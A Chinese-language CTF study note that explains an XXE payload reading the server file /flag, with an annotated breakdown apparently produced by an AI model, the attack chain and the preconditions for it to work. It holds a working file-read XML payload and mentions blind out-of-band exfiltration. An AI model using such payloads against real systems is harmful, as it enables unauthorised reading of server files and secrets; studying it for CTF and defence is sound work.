### #xml大体框架 
#外部实体 示例

```request
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>
<ctfshow>&xxe;</ctfshow>
</root>
```
一般直接用即可，不用专注于xml细节，只需要专注于实体
不过这里把xml payload框架拆解一下：
```xml
<?xml version="1.0"?>                        <!-- XML 声明，未指定编码默认 UTF-8 -->
<!DOCTYPE test [                             <!-- 为根元素 test 定义内联 DTD -->
  <!ENTITY test2                             <!-- 声明一个名为 test2 的实体 -->
    SYSTEM "file:///flag"                    <!-- SYSTEM = 外部实体，从本地文件系统加载 -->
  >                                          <!-- 解析时将 /flag 的内容绑定到 test2 -->
]>                                           <!-- DTD 定义结束 -->
<test>                                       <!-- 根元素，与 DOCTYPE 声明的名称一致 -->
  <fuck>&test2;</fuck>                       <!-- &test2; 展开后即 /flag 文件的内容 -->
</test>                                      <!-- 根元素闭合 -->
]
```
其中 `DTD` 是 `文档类型定义` 的简称。它的核心作用是为一个 XML 文档定义**合法的结构**和**规则**。你可以把它理解成一套“语法”或“模板”，用来约束 XML 文件中能写什么、怎么写。

更多xxe基础请参见[[xxe的部分原理和利用面]]

----
---
---


## Sonnet-4.6详细拆解

这是一个经典的 **XXE (XML External Entity) 注入** payload，逐行拆解如下：

---

## HTTP Header

```
Content-Type: application/xml
```

告诉服务器请求体是 XML 格式，触发服务端的 XML 解析器。

---

## XML 声明

```xml
<?xml version="1.0" encoding="utf-8"?>
```

标准 XML 文件头，声明版本和编码。

---

## 核心：DTD 外部实体定义

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
```

这是 XXE 的关键部分：

|组成|含义|
|---|---|
|`!DOCTYPE root`|为根元素 `root` 定义一个内联 DTD|
|`!ENTITY xxe`|声明一个名为 `xxe` 的实体|
|`SYSTEM`|表示这是**外部实体**，从外部 URI 加载内容|
|`"file:///flag"`|URI 指向服务器本地文件 `/flag`|

当 XML 解析器处理这段声明时，会尝试**读取服务器上 `/flag` 文件的内容**，并将其绑定到实体 `xxe`。

---

## XML Body（实体引用）

```xml
<root>
  <ctfshow>&xxe;</ctfshow>
</root>
```

|组成|含义|
|---|---|
|`<root>`|根元素，与 DOCTYPE 匹配|
|`&xxe;`|**引用**上面定义的实体，展开后变成 `/flag` 文件的内容|
|`<ctfshow>`|子元素，用来承载泄露出来的数据|

---

## 完整攻击链

```
发送 XML → 解析器展开 &xxe; → 读取 /flag 文件
→ 文件内容嵌入响应 → 攻击者拿到 flag
```

---

## 利用前提

服务端 XML 解析器需要满足：

- 允许解析外部实体（默认开启的老版本库，如 PHP `libxml`、Java `DocumentBuilder` 等）
- 解析结果会回显到响应中（有回显 XXE）

如果无回显，则需要改用 **Blind XXE**（带外传输，通过 `http://` 将数据发到自己的服务器）。